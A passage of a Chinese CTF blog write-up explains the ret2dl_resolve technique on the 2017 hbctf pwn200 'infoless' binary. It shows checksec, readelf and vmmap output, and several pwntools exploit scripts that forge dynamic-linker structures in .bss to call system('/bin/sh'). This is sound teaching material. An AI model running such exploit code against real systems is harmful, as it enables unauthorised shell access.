class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">22</span></div><div class=\"line\">elf = ELF(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\">read_plt = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">vuln_addr = <span class=\"number\">0x80484CB</span></div><div class=\"line\">bss_addr = <span class=\"number\">0x8049820</span></div><div class=\"line\">fflush_plt = elf.symbols[<span class=\"string\">'fflush'</span>]</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\"></div><div class=\"line\">    addr = bss_addr</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'/bin/sh\\x00'</span>.ljust(<span class=\"number\">20</span>, <span class=\"string\">'a'</span>)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    addr = <span class=\"number\">0x8048276</span></div><div class=\"line\">    gdb,attach(p)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'b'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'system\\x00'</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    payload1 = <span class=\"number\">14</span> * <span class=\"string\">'c'</span> + p32(fflush_plt) + p32(<span class=\"number\">0</span>) + p32(bss_addr)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。</p>\n<h3 id=\"节的权限\"><a href=\"#节的权限\" class=\"headerlink\" title=\"节的权限\"></a>节的权限</h3><p>通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">wndbg&gt; vmmap </div><div class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div><div class=\"line\"> <span class=\"number\">0x8048000</span>  <span class=\"number\">0x8049000</span> r-xp     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class=\"line\"> <span class=\"number\">0x8049000</span>  <span class=\"number\">0x804a000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class=\"line\"><span class=\"number\">0xf7dfa000</span> <span class=\"number\">0xf7dfc000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7dfc000</span> <span class=\"number\">0xf7fad000</span> r-xp   <span class=\"number\">1b1000</span> <span class=\"number\">0</span>      /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7fad000</span> <span class=\"number\">0xf7faf000</span> r--p     <span class=\"number\">2000</span> <span class=\"number\">1b0000</span> /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7faf000</span> <span class=\"number\">0xf7fb0000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">1b2000</span> /lib32/libc-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7fb0000</span> <span class=\"number\">0xf7fb3000</span> rw-p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7fd2000</span> <span class=\"number\">0xf7fd4000</span> rw-p     <span class=\"number\">2000</span> <span class=\"number\">0</span>      </div><div class=\"line\"><span class=\"number\">0xf7fd4000</span> <span class=\"number\">0xf7fd7000</span> r--p     <span class=\"number\">3000</span> <span class=\"number\">0</span>      [vvar]</div><div class=\"line\"><span class=\"number\">0xf7fd7000</span> <span class=\"number\">0xf7fd9000</span> r-xp     <span class=\"number\">2000</span> <span class=\"number\">0</span>      [vdso]</div><div class=\"line\"><span class=\"number\">0xf7fd9000</span> <span class=\"number\">0xf7ffb000</span> r-xp    <span class=\"number\">22000</span> <span class=\"number\">0</span>      /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7ffc000</span> <span class=\"number\">0xf7ffd000</span> r--p     <span class=\"number\">1000</span> <span class=\"number\">22000</span>  /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xf7ffd000</span> <span class=\"number\">0xf7ffe000</span> rw-p     <span class=\"number\">1000</span> <span class=\"number\">23000</span>  /lib32/ld-<span class=\"number\">2.24</span>.so</div><div class=\"line\"><span class=\"number\">0xfffdd000</span> <span class=\"number\">0xffffe000</span> rw-p    <span class=\"number\">21000</span> <span class=\"number\">0</span>      [stack]</div></pre></td></tr></table></figure>\n<h3 id=\"关于传参\"><a href=\"#关于传参\" class=\"headerlink\" title=\"关于传参\"></a>关于传参</h3><p>我的一个失败的exp：<br><figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></div><div class=\"line\"><span class=\"comment\"># coding=utf-8</span></div><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"></div><div class=\"line\">slog = <span class=\"number\">1</span></div><div class=\"line\"><span class=\"built_in\">local</span> = <span class=\"number\">1</span></div><div class=\"line\">debug = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">global</span> p</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> slog: context(log_level = <span class=\"string\">'debug'</span>)</div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span>:</div><div class=\"line\">    p = <span class=\"built_in\">process</span>(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    p = remote()</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> <span class=\"built_in\">local</span> <span class=\"keyword\">and</span> debug:</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./infoless'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">offset</span> = <span class=\"number\">22</span></div><div class=\"line\"><span class=\"comment\"># .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># .dynsym   sym = .dynsym + reloc-&gt;info , fake reloc-&gt;info to locate sym on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># .dynstr   name = .dynstr + sym-&gt;value, fake sym-&gt;value to locate name on bss</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">#  name_str fake name_str on bss</span></div><div class=\"line\"></div><div class=\"line\">pr = <span class=\"number\">0x08048361</span></div><div class=\"line\">relplt_addr = <span class=\"number\">0x8048320</span></div><div class=\"line\">vuln_addr = <span class=\"number\">0x80484CB</span></div><div class=\"line\">plt_addr = <span class=\"number\">0x8048370</span></div><div class=\"line\">bss_addr = <span class=\"number\">0x8049820</span></div><div class=\"line\">dynsym_addr = <span class=\"number\">0x80481bc</span></div><div class=\"line\">dynstr_addr = <span class=\"number\">0x0804825c</span></div><div class=\"line\">read_plt = elf.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\"></div><div class=\"line\">def pwn():</div><div class=\"line\">    print <span class=\"string\">'bss_addr =&gt; '</span>, hex(bss_addr)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># send /bin/sh</span></div><div class=\"line\">    addr = bss_addr</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(bss_addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    payload2 = <span class=\"string\">'/bin/sh\\x00'</span>.ljust(<span class=\"number\">20</span>, <span class=\"string\">'a'</span>)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\"># fake .rel.plt on bss</span></div><div class=\"line\">    <span class=\"comment\"># 0x0804970c      0x00000107</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    print <span class=\"string\">'addr - relplt_addr =&gt; '</span>, hex(addr - relplt_addr)</div><div class=\"line\">    off = ((addr - dynsym_addr) / <span class=\"number\">0x10</span> + <span class=\"number\">1</span>) * <span class=\"number\">0x100</span> + <span class=\"number\">0x7</span></div><div class=\"line\">    print <span class=\"string\">'off =&gt; '</span>, hex(off)</div><div class=\"line\">    payload2 = p32(elf.got[<span class=\"string\">'fflush'</span>]) + p32(off)</div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake .dynsym on bss</span></div><div class=\"line\">    <span class=\"comment\"># 0x0000001a      0x00000000      0x00000000      0x00000012</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\">    off = addr - dynstr_addr + <span class=\"number\">0x10</span></div><div class=\"line\">    print <span class=\"string\">'offset_dynstr =&gt; '</span>, hex(off) <span class=\"comment\"># 15f0</span></div><div class=\"line\">    payload2 = p32(off) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake .dynstr</span></div><div class=\"line\">    addr += <span class=\"built_in\">len</span>(payload2)</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class=\"number\">0</span>) + p32(addr) + p32(<span class=\"number\">100</span>)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\">    payload2 = <span class=\"string\">'system\\x00'</span></div><div class=\"line\">    p.sendline(payload2)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p, open('debug'))</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\"># fake reloc_args &amp; mov eip, plt[0]</span></div><div class=\"line\">    reloc_args = bss_addr - relplt_addr + <span class=\"number\">0x14</span></div><div class=\"line\">    print <span class=\"string\">'reloc_args =&gt; '</span>, hex(reloc_args)</div><div class=\"line\">    gdb.attach(p, <span class=\"built_in\">open</span>(<span class=\"string\">'debug'</span>))</div><div class=\"line\">    payload1 = <span class=\"built_in\">offset</span> * <span class=\"string\">'a'</span> + p32(plt_addr) + p32(reloc_args) + p32(elf.plt[<span class=\"string\">'fflush'</span>]) + p32(vuln_addr) + p32(bss_addr)</div><div class=\"line\">    p.sendline(payload1)</div><div class=\"line\"><span class=\"comment\">#    gdb.attach(p)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    pwn()</div><div class=\"line\">    p.interactive()</div></pre></td></tr></table></figure></p>\n<p>最后在控制<code>eip</code>到<code>plt[0]</code>的位置时，我遇到了传参的问题，当我将<code>reloc_adgs</code>压入栈中后，我无法将将要调用函数<code>fflush()(事实上是systm())</code>的参数<code>/bin/sh\\x00</code>压入栈中了，这里可能需要用到rop去控制esp和栈的内容，暂时先不去研究这个。</p>\n<h3 id=\"其他可能的利用？\"><a href=\"#其他可能的利用？\" class=\"headerlink\" title=\"其他可能的利用？\"></a>其他可能的利用？</h3><p>当我们可以控制<code>.dynamic</code>后是否可以改变别的值去控制程序（连接器？）解析到其他的地址上，是否还有其他的利用方式？</p>\n<h3 id=\"x64\"><a href=\"#x64\" class=\"headerlink\" title=\"x64\"></a>x64</h3><p>关于64位的利用方式应该是差不多的，暂时没精力研究了，先挖坑，以后填吧，先去研究沙盒了。</p>\n<h2 id=\"叹\"><a href=\"#叹\" class=\"headerlink\" title=\"叹\"></a>叹</h2><p>还是太菜了，弄明白个这个玩意都要花接近一天。。。。TAT</p>\n","excerpt":"","more":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。</p>\n<h2 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h2><blockquote>\n<ul>\n<li>控制EIP为PLT[0]的地址，只需传递一个index_arg参数</li>\n<li>控制index_arg的大小，使reloc的位置落在可控地址内</li>\n<li>伪造reloc的内容，使sym落在可控地址内</li>\n<li>伪造sym的内容，使name落在可控地址内</li>\n<li>伪造name为任意库函数，如system</li>\n</ul>\n</blockquote>\n<p>所以我们得出结论，我们最终要伪造三个节信息，分别是<code>.rel.plt</code>, <code>.dynsym</code>, <code>.dynstr</code>，并且在<code>dynstr</code>上布置我们希望调用的函数的<code>str</code>，比如<code>system</code>。并且我们要通过控制<code>index_args</code>参数和<code>eip</code>指针是的程序按照我们的设计来调用函数。</p>\n<h2 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h2><p>以2017hbctf第一场的pwn200来分析</p>\n<p>程序逻辑<br><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">int __cdecl main()</div><div class=\"line\">&#123;</div><div class=\"line\">  setvbuf(stdin, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  setvbuf(stdout, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  setvbuf(stderr, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</div><div class=\"line\">  read_buf();</div><div class=\"line\">  fflush(stdout);</div><div class=\"line\">  return <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight aspectj\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\">ssize_t <span class=\"title\">read_buf</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> buf; <span class=\"comment\">// [sp+6h] [bp-12h]@1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">return</span> <span class=\"title\">read</span><span class=\"params\">(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">0x3C</span>u)</span></span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>checksec<br><figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">root@kali ~/c/<span class=\"number\">2</span>/p/infoless<span class=\"comment\"># checksec infoless </span></div><div class=\"line\">[*] <span class=\"string\">'/root/ctf-problem/2017hbctf/pwn/infoless/infoless'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     i386<span class=\"bullet\">-32</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    <span class=\"literal\">No</span> RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    <span class=\"literal\">No</span> canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE (<span class=\"number\">0x8048000</span>)</div></pre></td></tr></table></figure></p>\n<p>除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。</p>\n<p>关于<code>.dynamic</code>：<br><figure class=\"highlight less\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">root</span>@<span class=\"selector-tag\">kali</span> ~/<span class=\"selector-tag\">c</span>/<span class=\"selector-tag\">2</span>/<span class=\"selector-tag\">p</span>/<span class=\"selector-tag\">infoless</span># <span class=\"selector-tag\">readelf</span> <span class=\"selector-tag\">-d</span> <span class=\"selector-tag\">infoless</span> </div><div class=\"line\"></div><div class=\"line\"><span class=\"selector-tag\">Dynamic</span> <span class=\"selector-tag\">section</span> <span class=\"selector-tag\">at</span> <span class=\"selector-tag\">offset</span> <span class=\"selector-tag\">0x70c</span> <span class=\"selector-tag\">contains</span> <span class=\"selector-tag\">24</span> <span class=\"selector-tag\">entries</span>:</div><div class=\"line\">  标记        类型                         名称/值</div><div class=\"line\"> <span class=\"selector-tag\">0x00000001</span> (NEEDED)                     共享库：<span class=\"selector-attr\">[libc.so.6]</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000c</span> (INIT)                       <span class=\"selector-tag\">0x8048340</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000d</span> (FINI)                       <span class=\"selector-tag\">0x80485c4</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000019</span> (INIT_ARRAY)                 <span class=\"selector-tag\">0x8049700</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000001b</span> (INIT_ARRAYSZ)               <span class=\"selector-tag\">4</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x0000001a</span> (FINI_ARRAY)                 <span class=\"selector-tag\">0x8049704</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000001c</span> (FINI_ARRAYSZ)               <span class=\"selector-tag\">4</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffef5</span> (GNU_HASH)                   <span class=\"selector-tag\">0x804818c</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000005</span> (STRTAB)                     <span class=\"selector-tag\">0x804825c</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000006</span> (SYMTAB)                     <span class=\"selector-tag\">0x80481bc</span></div><div class=\"line\"> <span class=\"selector-tag\">0x0000000a</span> (STRSZ)                      <span class=\"selector-tag\">109</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x0000000b</span> (SYMENT)                     <span class=\"selector-tag\">16</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000015</span> (DEBUG)                      <span class=\"selector-tag\">0x0</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000003</span> (PLTGOT)                     <span class=\"selector-tag\">0x80497f8</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000002</span> (PLTRELSZ)                   <span class=\"selector-tag\">32</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000014</span> (PLTREL)                     <span class=\"selector-tag\">REL</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000017</span> (JMPREL)                     <span class=\"selector-tag\">0x8048320</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000011</span> (REL)                        <span class=\"selector-tag\">0x8048300</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000012</span> (RELSZ)                      <span class=\"selector-tag\">32</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x00000013</span> (RELENT)                     <span class=\"selector-tag\">8</span> (bytes)</div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffffe</span> (VERNEED)                    <span class=\"selector-tag\">0x80482e0</span></div><div class=\"line\"> <span class=\"selector-tag\">0x6fffffff</span> (VERNEEDNUM)                 <span class=\"selector-tag\">1</span></div><div class=\"line\"> <span class=\"selector-tag\">0x6ffffff0</span> (VERSYM)                     <span class=\"selector-tag\">0x80482ca</span></div><div class=\"line\"> <span class=\"selector-tag\">0x00000000</span> (NULL)                       <span class=\"selector-tag\">0x0</span></div></pre></td></tr></table></figure></p>\n<p>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。</p>\n<p>通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎<code>.dynamic</code>节似乎是可写的，那么我们似乎可以通过修改<code>.dynamic</code>的偏移信息使得直接定位<code>.dynstr</code>的地址到我们伪造的<code>.dynstr(bss)</code>上了。</p>\n<p>参考exp:<br><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"meta\"># -*- coding:utf-8 -*- </span></div><div class=\"line\"> </div><div class=\"line\">from pwn import *</div><div class=\"line\">from time import *</div><div class=\"line\"> </div><div class=\"line\">vulFunAddr = <span class=\"number\">0x080484CB</span></div><div class=\"line\">readpltAddr = <span class=\"number\">0x08048380</span></div><div class=\"line\">fflushpltAddr = <span 